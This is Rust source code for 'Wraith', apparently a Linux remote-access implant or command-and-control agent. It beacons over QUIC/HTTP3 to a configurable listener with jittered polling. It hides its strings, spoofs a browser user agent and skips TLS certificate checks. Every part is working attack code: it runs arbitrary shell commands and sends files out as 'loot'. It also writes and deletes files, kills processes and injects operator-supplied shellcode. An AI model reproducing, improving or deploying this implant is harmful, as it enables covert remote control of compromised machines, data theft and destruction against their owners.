// Wraith is a Linux-only agent
#[cfg(not(target_os = "linux"))]
compile_error!("Wraith is a Linux-only agent. Build with: cargo build --target=x86_64-unknown-linux-musl");

mod inject;

use std::collections::HashMap;
use std::env;
use std::fs;
use std::path::Path;
use std::process::Command as ProcessCommand;
use std::sync::Arc;
use std::time::Duration;

use base64::{engine::general_purpose, Engine as _};
use bytes::{Buf, Bytes};
use h3_quinn::Connection;
use hmac::{Hmac, Mac};
use http::{Method, Request, Uri};
use quinn::{ClientConfig, Endpoint};
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::Sha256;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::sync::Mutex;
use uuid::Uuid;

type HmacSha256 = Hmac<Sha256>;

// Build-time configuration
macro_rules! env_or_default {
    ($env:expr, $default:expr) => {
        match option_env!($env) {
            Some(v) if !v.is_empty() => v,
            _ => $default,
        }
    };
}

const LISTENER_HOST: &str = env_or_default!("WRAITH_HOST", "localhost");
const LISTENER_PORT: &str = env_or_default!("WRAITH_PORT", "8081");
const LISTENER_ENDPOINT: &str = env_or_default!("WRAITH_ENDPOINT", "/wiki");
const HMAC_KEY_HEX: &str = env_or_default!("WRAITH_HMAC_KEY", "29b3249406c7185cd1bedc33c9b32acd147244bd87ebd9c83e7fc6692da2c4ce");
const RECONNECT_INTERVAL: u64 = 15;
const JITTER_SECONDS: u64 = 10;
const USER_AGENT: &str = env_or_default!("WRAITH_USER_AGENT", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");


#[derive(Debug, Clone, Serialize, Deserialize)]
struct AgentRegistration {
    uuid: String,
    name: String,
    ip: String,
    os: String,
    #[serde(rename = "agent_type")]
    agent_type: String,
    #[serde(rename = "reconnectInterval")]
    reconnect_interval: u64,
    privileges: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Command {
    id: i32,
    #[serde(rename = "agentId")]
    agent_id: String,
    command: String,
    #[serde(rename = "clientUsername")]
    client_username: String,
    status: String,
    output: String,
    #[serde(rename = "createdAt")]
    created_at: String,
    #[serde(rename = "executedAt")]
    executed_at: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CommandResponse {
    #[serde(rename = "commandId")]
    command_id: i32,
    output: String,
    status: String,
}

#[derive(Debug, Clone)]
struct AgentState {
    agent_id: String,
    reconnect_interval: u64,
    jitter_seconds: u64,
    hmac_key: Vec<u8>,
}

impl AgentState {
    fn new() -> Self {
        let hmac_key = HMAC_KEY_HEX.as_bytes().to_vec();
        Self {
            agent_id: Uuid::new_v4().to_string(),
            reconnect_interval: RECONNECT_INTERVAL,
            jitter_seconds: JITTER_SECONDS,
            hmac_key,
        }
    }
}

fn generate_hmac(message: &str, key: &[u8]) -> String {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(message.as_bytes());
    hex::encode(mac.finalize().into_bytes())
}

fn sign_request(method: &str, path: &str, body: &str, key: &[u8]) -> (String, String) {
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .to_string();
    let message = format!("{}{}{}{}", method, path, timestamp, body);
    let signature = generate_hmac(&message, key);
    (timestamp, signature)
}

fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let json_data = serde_json::to_string(data)?;
    let (timestamp, signature) = sign_request("POST", LISTENER_ENDPOINT, &json_data, key);

    let wrapper = json!({
        "agent_type": "wraith",
        "data": serde_json::value::RawValue::from_string(json_data)?,
        "timestamp": timestamp,
        "signature": signature,
    });

    Ok(serde_json::to_vec(&wrapper)?)
}

async fn send_quic_request(
    endpoint: &Endpoint,
    path: &str,
    data: &[u8],
    headers: HashMap<String, String>,
) -> Result<Value, Box<dyn std::error::Error>> {
    let addr_str = format!("{}:{}", LISTENER_HOST, LISTENER_PORT);
    let server_addr = tokio::net::lookup_host(&addr_str)
        .await?
        .find(|addr| addr.is_ipv4())
        .ok_or("Failed to resolve hostname")?;

    let quinn_conn = endpoint.connect(server_addr, LISTENER_HOST)?.await?;
    let h3_conn = Connection::new(quinn_conn);
    let (mut driver, mut send_request) = h3::client::new(h3_conn).await?;
    
    tokio::spawn(async move {
        let _ = driver.wait_idle().await;
    });

    let uri: Uri = format!("https://{}:{}{}", LISTENER_HOST, LISTENER_PORT, path)
        .parse()?;

    let mut req = Request::builder()
        .method(Method::POST)
        .uri(uri)
        .header(obfstr::obfstr!("user-agent"), USER_AGENT)
        .header(obfstr::obfstr!("content-type"), obfstr::obfstr!("application/json"));

    for (key, value) in headers {
        req = req.header(key, value);
    }

    let req = req.body(())?;

    let mut stream = send_request.send_request(req).await?;
    stream.send_data(Bytes::copy_from_slice(data)).await?;
    stream.finish().await?;

    let resp = stream.recv_response().await?;
    let status = resp.status().as_u16();

    let mut body = Vec::new();
    while let Some(mut chunk) = stream.recv_data().await? {
        body.extend_from_slice(chunk.chunk());
        chunk.advance(chunk.remaining());
    }

    let body_str = String::from_utf8_lossy(&body);

    Ok(json!({
        "status": status,
        "body": body_str
    }))
}

async fn register_agent(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<(), Box<dyn std::error::Error>> {
    let reg = AgentRegistration {
        uuid: state.agent_id.clone(),
        name: state.agent_id.clone(),
        ip: get_local_ip(),
        os: get_os_info(),
        agent_type: "wraith".to_string(),
        reconnect_interval: state.reconnect_interval,
        privileges: get_privilege_info(),
    };

    let data = wrap_with_hmac(&serde_json::to_value(&reg)?, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Err(obfstr::obfstr!("failed").into());
    }

    Ok(())
}

async fn get_pending_commands(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<Vec<Command>, Box<dyn std::error::Error>> {
    let poll_request = json!({ "agentId": state.agent_id });
    let data = wrap_with_hmac(&poll_request, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Ok(vec![]);
    }

    let body: Value = serde_json::from_str(response["body"].as_str().unwrap_or("{}"))?;
    let commands: Vec<Command> = serde_json::from_value(body["commands"].clone())?;

    Ok(commands)
}

async fn send_command_response(
    endpoint: &Endpoint,
    state: &AgentState,
    command_id: i32,
    output: String,
    status: String,
) -> Result<(), Box<dyn std::error::Error>> {
    let response = CommandResponse {
        command_id,
        output: output.clone(),
        status,
    };

    let mut headers = HashMap::new();
    if output.contains("LOOT_ENTRIES:") {
        headers.insert("type".to_string(), "loot".to_string());
    }

    let data = wrap_with_hmac(&serde_json::to_value(&response)?, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, headers).await?;
    Ok(())
}

fn get_local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|socket| {
            socket.connect("8.8.8.8:80")?;
            socket.local_addr()
        })
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| obfstr::obfstr!("unknown").to_string())
}

fn get_os_info() -> String {
    format!("{} {}", std::env::consts::OS, std::env::consts::ARCH)
}

#[cfg(target_os = "linux")]
fn get_privilege_info() -> String {
    use nix::unistd::{getuid, geteuid};
    
    let uid = getuid().as_raw();
    let euid = geteuid().as_raw();
    let is_root = uid == 0 || euid == 0;

    json!({
        "isRoot": is_root,
        "uid": uid,
        "euid": euid
    }).to_string()
}

#[cfg(not(target_os = "linux"))]
compile_error!("Wraith is a Linux-only agent. Build with: cargo build --target=x86_64-unknown-linux-musl");

async fn execute_command(cmd_str: &str) -> String {
    let parts: Vec<&str> = cmd_str.trim().split_whitespace().collect();
    if parts.is_empty() {
        return obfstr::obfstr!("empty command").to_string();
    }

    let command = parts[0];
    let args = &parts[1..];

    match command {
        "ls" => handle_ls(args).await,
        "cd" => handle_cd(args).await,
        "get" => handle_get(args).await,
        "put" => handle_put(args).await,
        "ps" => handle_ps().await,
        "kill" => handle_kill(args).await,
        "rm" => handle_rm(args).await,
        "rmdir" => handle_rmdir(args).await,
        "injectsc" => handle_inject_sc(args).await,
        _ => handle_shell(cmd_str).await,
    }
}

async fn handle_ls(args: &[&str]) -> String {
    let path = if args.is_empty() { "." } else { args[0] };
    
    // Get absolute path
    let abs_path = match fs::canonicalize(path) {
        Ok(p) => p,
        Err(e) => return format!("ls error: {}", e),
    };
    
    match fs::read_dir(&abs_path) {
        Ok(entries) => {
            let mut output = String::new();
            output.push_str(&format!("📁 {}\n", abs_path.display()));
            
            let mut loot_entries = Vec::new();

            // Collect and sort entries: directories first, then files
            let mut all_entries: Vec<_> = entries.flatten().collect();
            all_entries.sort_by_key(|e| {
                let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
                (!is_dir, e.file_name())
            });

            for entry in all_entries {
                if let Ok(metadata) = entry.metadata() {
                    let is_dir = metadata.is_dir();
                    let size = metadata.len();
                    let name = entry.file_name().to_string_lossy().to_string();
                    
                    // Build full absolute path
                    let full_path = abs_path.join(&name);
                    let full_path_str = full_path.to_string_lossy().to_string();
                    
                    // Format output
                    let icon = if is_dir { "📁" } else { "📄" };
                    let suffix = if is_dir { "/" } else { "" };
                    output.push_str(&format!("├── {} {}{}\n", icon, name, suffix));

                    loot_entries.push(json!({
                        "type": if is_dir { "directory" } else { "file" },
                        "path": full_path_str,
                        "name": name,
                        "size": size,
                    }));
                }
            }

            if !loot_entries.is_empty() {
                if let Ok(loot_json) = serde_json::to_string(&loot_entries) {
                    output.push_str(&format!("\nLOOT_ENTRIES:{}", loot_json));
                }
            }

            output
        }
        Err(e) => format!("ls error: {}", e),
    }
}

async fn handle_cd(args: &[&str]) -> String {
    if args.is_empty() {
        return obfstr::obfstr!("usage: cd <directory>").to_string();
    }

    match env::set_current_dir(args[0]) {
        Ok(_) => format!("Changed to: {}", env::current_dir().unwrap().display()),
        Err(e) => format!("cd error: {}", e),
    }
}

async fn handle_get(args: &[&str]) -> String {
    if args.is_empty() {
        return obfstr::obfstr!("usage: get <file>").to_string();
    }

    let file_path = args[0];
    
    // Get absolute path
    let abs_path = match fs::canonicalize(file_path) {
        Ok(p) => p,
        Err(e) => return format!("get error: {}", e),
    };
    
    match fs::read(&abs_path) {
        Ok(content) => {
            let hash = format!("{:x}", md5::compute(&content));
            let filename = abs_path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| file_path.to_string());
            
            let abs_path_str = abs_path.to_string_lossy().to_string();

            let loot_entry = json!({
                "type": "file",
                "name": filename,
                "path": abs_path_str,
                "size": content.len(),
                "content": general_purpose::STANDARD.encode(&content),
                "md5": hash,
            });

            match serde_json::to_string(&vec![loot_entry]) {
                Ok(loot_json) => format!("{}\nLOOT_ENTRIES:{}", filename, loot_json),
                Err(_) => format!("get error: failed to serialize loot"),
            }
        }
        Err(e) => format!("get error: {}", e),
    }
}

async fn handle_put(args: &[&str]) -> String {
    if args.len() < 2 {
        return obfstr::obfstr!("usage: put <file> <hex_content>").to_string();
    }

    let file_path = args[0];
    let hex_content = args[1];

    match hex::decode(hex_content) {
        Ok(content) => {
            let path_obj = Path::new(file_path);
            if let Some(parent) = path_obj.parent() {
                let _ = fs::create_dir_all(parent);
            }

            match fs::write(file_path, &content) {
                Ok(_) => {
                    // Get absolute path after writing
                    let abs_path = match fs::canonicalize(file_path) {
                        Ok(p) => p,
                        Err(_) => Path::new(file_path).to_path_buf(),
                    };
                    
                    let hash = format!("{:x}", md5::compute(&content));
                    let filename = abs_path
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_else(|| file_path.to_string());
                    
                    let abs_path_str = abs_path.to_string_lossy().to_string();

                    let loot_entry = json!({
                        "type": "file",
                        "name": filename,
                        "path": abs_path_str,
                        "size": content.len(),
                        "md5": hash,
                    });

                    match serde_json::to_string(&vec![loot_entry]) {
                        Ok(loot_json) => format!("{}\nLOOT_ENTRIES:{}", filename, loot_json),
                        Err(_) => format!("File written but failed to serialize loot"),
                    }
                }
                Err(e) => format!("put error: {}", e),
            }
        }
        Err(e) => format!("hex decode error: {}", e),
    }
}

async fn handle_ps() -> String {
    match fs::read_dir("/proc") {
        Ok(entries) => {
            let mut output = String::from("PID    NAME\n");
            
            for entry in entries.flatten() {
                if let Ok(file_name) = entry.file_name().into_string() {
                    if file_name.parse::<u32>().is_ok() {
                        let cmdline_path = format!("/proc/{}/cmdline", file_name);
                        if let Ok(cmdline) = fs::read_to_string(&cmdline_path) {
                            let name = cmdline.split('\0').next().unwrap_or("?");
                            output.push_str(&format!("{:<6} {}\n", file_name, name));
                        }
                    }
                }
            }
            
            output
        }
        Err(e) => format!("ps error: {}", e),
    }
}

#[cfg(target_os = "linux")]
async fn handle_kill(args: &[&str]) -> String {
    if args.is_empty() {
        // Kill the agent itself (no arguments)
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(1)).await;
            std::process::exit(0);
        });
        return obfstr::obfstr!("Agent terminating...").to_string();
    }

    // Kill other process by PID (with argument)
    match args[0].parse::<i32>() {
        Ok(pid) => {
            use nix::sys::signal::{kill, Signal};
            use nix::unistd::Pid;
            
            match kill(Pid::from_raw(pid), Signal::SIGKILL) {
                Ok(_) => format!("Killed process {}", pid),
                Err(e) => format!("kill error: {}", e),
            }
        }
        Err(_) => obfstr::obfstr!("invalid pid").to_string(),
    }
}


async fn handle_rm(args: &[&str]) -> String {
    if args.is_empty() {
        return obfstr::obfstr!("usage: rm <file>").to_string();
    }

    match fs::remove_file(args[0]) {
        Ok(_) => format!("Removed: {}", args[0]),
        Err(e) => format!("rm error: {}", e),
    }
}

async fn handle_rmdir(args: &[&str]) -> String {
    if args.is_empty() {
        return obfstr::obfstr!("usage: rmdir <directory>").to_string();
    }

    match fs::remove_dir_all(args[0]) {
        Ok(_) => format!("Removed directory: {}", args[0]),
        Err(e) => format!("rmdir error: {}", e),
    }
}

async fn handle_inject_sc(args: &[&str]) -> String {
    if args.is_empty() {
        return obfstr::obfstr!("usage: injectsc <hex_shellcode>").to_string();
    }

    match hex::decode(args[0]) {
        Ok(shellcode) => inject::inject_shellcode(&shellcode),
        Err(e) => format!("hex decode error: {}", e),
    }
}

async fn handle_shell(cmd: &str) -> String {
    match ProcessCommand::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
    {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() {
                result.push_str("\nSTDERR:\n");
                result.push_str(&stderr);
            }
            result
        }
        Err(e) => format!("exec error: {}", e),
    }
}

#[derive(Debug)]
struct SkipServerVerification;

impl rustls::client::danger::ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> {
    let mut client_crypto = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(SkipServerVerification))
        .with_no_client_auth();

    client_crypto.alpn_protocols = vec![b"h3".to_vec()];

    let client_config = ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(client_crypto)?,
    ));

    let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
    endpoint.set_default_client_config(client_config);

    Ok(endpoint)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = AgentState::new();

    let endpoint = create_quic_endpoint().await?;

    // Registration loop
    loop {
        if register_agent(&endpoint, &state).await.is_ok() {
            break;
        }
        tokio::time::sleep(Duration::from_secs(RECONNECT_INTERVAL)).await;
    }

    // Main command loop
    let state = Arc::new(Mutex::new(state));
    loop {
        let interval = {
            let state_guard = state.lock().await;
            state_guard.reconnect_interval + rand::thread_rng().gen_range(0..=state_guard.jitter_seconds)
        };

        tokio::time::sleep(Duration::from_secs(interval)).await;

        let commands = {
            let state_guard = state.lock().await;
            match get_pending_commands(&endpoint, &state_guard).await {
                Ok(cmds) => cmds,
                Err(_) => continue,
            }
        };

        for cmd in commands {
            let output = execute_command(&cmd.command).await;
            let state_guard = state.lock().await;
            let _ = send_command_response(
                &endpoint,
                &state_guard,
                cmd.id,
                output,
                obfstr::obfstr!("completed").to_string(),
            )
            .await;
        }
    }
}
